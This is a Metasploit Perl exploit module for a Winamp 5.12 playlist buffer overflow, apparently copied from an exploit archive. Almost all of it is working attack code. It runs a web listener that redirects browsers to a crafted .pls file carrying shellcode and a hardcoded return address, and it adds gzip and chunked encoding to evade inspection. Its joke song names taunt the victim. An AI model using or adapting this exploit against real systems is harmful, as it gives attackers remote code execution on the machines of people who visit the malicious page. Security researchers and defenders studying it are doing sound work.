Winamp <= 5.12 (Crafted PLS) Remote Buffer Overflow Exploit (meta)
==================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::winamp_playlist_unc;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

 my $advanced =
  {
	&#039;Gzip&#039;       => [1, &#039;Enable gzip content encoding&#039;],
	&#039;Chunked&#039;    => [1, &#039;Enable chunked transfer encoding&#039;],
	&#039;Humor&#039;      => [0, &#039;Enable humorous song names&#039;],
  };

my $info =
  {
	&#039;Name&#039;           => &#039;Winamp Playlist UNC Path Computer Name Overflow&#039;,
	&#039;Version&#039;        => &#039;$Revision: 1.3 $&#039;,
	&#039;Authors&#039;        =>
	  [
		&#039;H D Moore <hdm [at] metasploit.com&#039;,
		&#039;Faithless <rhyskidd [at] gmail.com>&#039;,
	  ],

	&#039;Description&#039;    =>
	  Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the Winamp media player.
	This flaw is triggered when a audio file path is specified, inside a
	playlist, that consists of a UNC path with a long computer name. This
	module delivers the playlist via the browser.
}),

	&#039;Arch&#039;           => [ &#039;x86&#039; ],
	&#039;OS&#039;             => [ &#039;win32&#039;, &#039;winxp&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039;           => 0,

	&#039;AutoOpts&#039;       => { &#039;EXITFUNC&#039; => &#039;process&#039; },
	&#039;UserOpts&#039;       =>
	  {
		&#039;HTTPPORT&#039; => [ 1, &#039;PORT&#039;, &#039;The local HTTP listener port&#039;, 8080      ],
		&#039;HTTPHOST&#039; => [ 0, &#039;HOST&#039;, &#039;The local HTTP listener host&#039;, "0.0.0.0" ],
	  	&#039;REALHOST&#039; => [ 0, &#039;HOST&#039;, &#039;External address to use for redirects (NAT)&#039; ],
	  },

	&#039;Payload&#039;        =>
	  {
		&#039;Space&#039;    => 526,
		&#039;BadChars&#039; => "\x00\x5c\x2f\x0a\x0d\x20",
		&#039;Keys&#039;     => [&#039;-bind&#039;],
		
		# Landing on \x5c\x5c trashes esp, restore from ecx
		&#039;PrependEncoder&#039; => "\x87\xe1",
		
		# Disable nop sleds completely (dont modify ecx)
		&#039;MinNops&#039;  => 0,
		&#039;MaxNops&#039;  => 0,
	  },
	&#039;Refs&#039;           =>
	  [
	  	[&#039;BID&#039;, &#039;16410&#039;],
		[&#039;URL&#039;, &#039;http://milw0rm.com/id.php?id=1458/&#039;],
		[&#039;URL&#039;, &#039;http://secunia.com/advisories/18649/&#039;],		
	  ],

	&#039;DefaultTarget&#039;  => 0,
	&#039;Targets&#039;        =>
	  [
	  	# Return to exe, 0x0d is replaced by 0x00 >:-)
		[ &#039;Winamp 5.12 Universal&#039;, 0x0d45fece  ]
	  ],

	&#039;Keys&#039;           => [ &#039;winamp&#039; ],

	&#039;DisclosureDate&#039; => &#039;Jan 29 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar(&#039;HTTPHOST&#039;),
		LocalPort => $self->GetVar(&#039;HTTPPORT&#039;),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => &#039;tcp&#039;
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar(&#039;HTTPPORT&#039;));
		return;
	}

	my $httphost = $self->GetVar(&#039;HTTPHOST&#039;);
	$httphost = Pex::Utils::SourceIP(&#039;1.2.3.4&#039;) if $httphost eq &#039;0.0.0.0&#039;;

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar(&#039;HTTPPORT&#039;) ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

	# Read the HTTP headers
	my $headers;
	while ( (my $line = $fd->RecvLine(10))) {
		$headers .= $line;
		last if $line eq "\r\n";
	}

	if ($url !~ /\.pls/i) {
		$self->PrintLine("[*] HTTP Client connected from $rhost:$rport, redirecting...");
		my $content =
			"<html><script>".
			"document.location=&#039;".RandomPath().".pls&#039;".
			"</script><body>".
			"One second please...</body></html>";	

		$fd->Send($self->BuildResponse($content));
		$fd->Close;
		return;
	}

	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $target      = $self->Targets->[$target_idx];
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	
	my $name = Pex::Text::AlphaNumText(int(rand(32)+1));
	my $file = Pex::Text::AlphaNumText(1026);
	
	substr($file, 1022, 4, pack(&#039;V&#039;, $target->[1]));
	substr($file, 0, length($shellcode), $shellcode);
	
	# Too many and it takes too long to load...
	my $pcnt = int(rand(10)+10);
	my $play =
		"[playlist]\r\n".
			
			$self->RandomNames($pcnt).
			
			"File".   ($pcnt+1). "=\\\\$file\r\n" .
			"Title".  ($pcnt+1). "=$name\r\n".
			"Length". ($pcnt+1). "=".sprintf("%x",rand(1024)+1)."\r\n".
			
			"NumberOfEntries=".($pcnt+1)."\r\n". 
			"Version=2\r\n";

	$self->PrintLine("[*] HTTP Client connected from $rhost:$rport, sending ".length($shellcode)." bytes of payload...");


	$fd->Send($self->BuildResponse($play, "audio/x-scpls"));

	# Prevents IE from throwing an error in some cases
	select(undef, undef, undef, 0.1);

	$fd->Close();
}

sub RandomPath {
	my $self = shift;
	my $path;

	while (length($path) < 32) {
		$path .= "/" . Pex::Text::AlphaNumText(int(rand(30) + 5));
	}
	return $path;
}

sub RandomNames {
	my $self = shift;
	return $self->RandomNamesFun(@_) if $self->GetVar(&#039;Humor&#039;);
	my $scnt = shift;
	
	my $ppad = &#039;&#039;;
	
	for my $idx (1..$scnt) {
		my $pname = Pex::Text::AlphaNumText(int(rand(32)+1));
		my $pfile = Pex::Text::AlphaNumText(int(rand(32)+1)).".mp3";
		$ppad .=
			"File".   ($idx). "=".$pfile."\r\n" .
			"Title".  ($idx). "=".$pname."\r\n".
			"Length". ($idx). "=".sprintf("%x",rand(1024)+1)."\r\n";	
	}
	return $ppad;
}

sub BuildResponse {
	my ($self, $content, $ctype) = @_;
	$ctype ||= "text/html";
	
	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: $ctype\r\n";

	if ($self->GetVar(&#039;Gzip&#039;)) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar(&#039;Chunked&#039;)) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= &#039;Content-Length: &#039; . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), &#039;&#039;);
		$chunked .= sprintf(&#039;%x&#039;, length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+10;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, &#039;gzip&#039;, &#039;-&#039;.$comp, &#039;-c&#039;, &#039;--force&#039;);
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}


sub RandomNamesFun {
	my $self = shift;
	my $scnt = shift;
	my @ffun = 
	(
		"Angelina vs Rosie O - Butter Time",	
		"Richards Gerbil Adventure",
		"Elton John Bachelor Party",
		"Paris Hilton Greased Chihuahua",
		"OH MY GOD",
		"SOMEONE IS OWNING",
		"MY WINAMP!",
	);
	
	my $ppad = &#039;&#039;;
	
	for my $idx (1..$scnt) {
		my $pname = $ffun[ $idx % scalar(@ffun) ];
		$ppad .=
			"File".   ($idx). "=".$pname."\r\n" .
			"Title".  ($idx). "=".$pname."\r\n".
			"Length". ($idx). "=".sprintf("%x",rand(1024)+1)."\r\n";	
	}
	return $ppad;
}
1;


